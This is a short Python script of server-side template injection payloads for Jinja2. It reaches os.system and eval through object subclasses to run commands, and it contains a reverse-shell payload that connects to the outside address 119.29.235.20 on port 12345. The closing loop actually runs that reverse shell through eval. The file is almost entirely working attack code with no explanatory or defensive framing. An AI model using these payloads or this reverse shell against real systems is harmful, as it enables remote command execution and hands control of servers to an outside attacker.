# !/usr/bin/env python
#  -*- coding: utf-8 -*-

class_available = """
{{ [].__class__.__base__.__subclasses__() }}
"""

systemid = """
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
  {% endif %}
{% endfor %}
"""

eval_codes = """
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.func_globals.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
"""

payload = '__import__("os").popen("/bin/bash -i >& /dev/tcp/119.29.235.20/12345 0>&1")'

for c in [].__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        for b in c.__init__.func_globals.values():
            if b.__class__ == {}.__class__:
                if 'eval' in b.keys():
                    b['eval'](payload)

